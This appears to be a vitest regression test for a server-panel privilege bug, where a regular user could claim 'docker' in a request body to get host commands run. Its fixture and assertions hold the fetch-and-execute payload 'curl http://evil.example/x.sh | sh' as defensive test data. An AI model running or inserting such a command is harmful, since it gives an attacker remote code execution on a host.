/**
 * Instance config privilege filtering (issue #2428 item 2)
 * ======================================================
 *
 * ATTACKER PROFILE: A regular panel user that owns an instance, on a panel where
 * the administrator enabled `allowChangeCmd` (a setting meant for Docker
 * instances, where the start command only runs inside the container).
 *
 * ATTACK CHAIN:
 *   1. `PUT /protected_instance/instance_update` forwards
 *      `checkInstanceAdvancedParams(config, isTopPermission)` to the daemon.
 *   2. That helper used to read `config.processType` from the REQUEST BODY.
 *   3. A regular user sent `{ processType: "docker", startCommand: "curl ... | sh" }`
 *      for a NON-Docker instance, the field was accepted, and the daemon then
 *      ran the attacker's command as the daemon user on the host.
 *
 * A test PASSES when the attack is BLOCKED. The caller now resolves the real
 * process type from the node (`getInstanceProcessTypeSafely`); `undefined`
 * (unknown instance / node unreachable) is treated as non-Docker.
 */
import { describe, expect, it, vi } from "vitest";

vi.mock("../../setting", () => ({
  systemConfig: { allowChangeCmd: true }
}));

// The helper under test is pure; keep the transport layer out of the module
// graph so the test does not need a node connection.
vi.mock("../../service/remote_service", () => ({ default: { getInstance: () => undefined } }));

import { checkInstanceAdvancedParams } from "../instance_service";

const maliciousBody = () =>
  ({
    processType: "docker",
    startCommand: "curl http://evil.example/x.sh | sh",
    updateCommand: "curl http://evil.example/x.sh | sh",
    docker: { env: ["A=B"] }
  }) as any;

describe("checkInstanceAdvancedParams: the request body cannot grant itself Docker rights", () => {
  it("drops advanced fields when the body claims docker but the node says nothing", () => {
    const result = checkInstanceAdvancedParams(maliciousBody(), false, undefined);
    expect(result).toEqual({});
  });

  it("drops advanced fields when the node reports a non-docker instance", () => {
    const result = checkInstanceAdvancedParams(maliciousBody(), false, "general");
    expect(result).toEqual({});
  });

  it("still allows advanced fields for a real docker instance when allowChangeCmd is on", () => {
    const result = checkInstanceAdvancedParams(maliciousBody(), false, "docker") as any;
    expect(result.startCommand).toBe("curl http://evil.example/x.sh | sh");
    expect(result.docker).toEqual({ env: ["A=B"] });
  });

  it("always allows an administrator to set the command", () => {
    const result = checkInstanceAdvancedParams(maliciousBody(), true, undefined) as any;
    expect(result.startCommand).toBe("curl http://evil.example/x.sh | sh");
  });
});
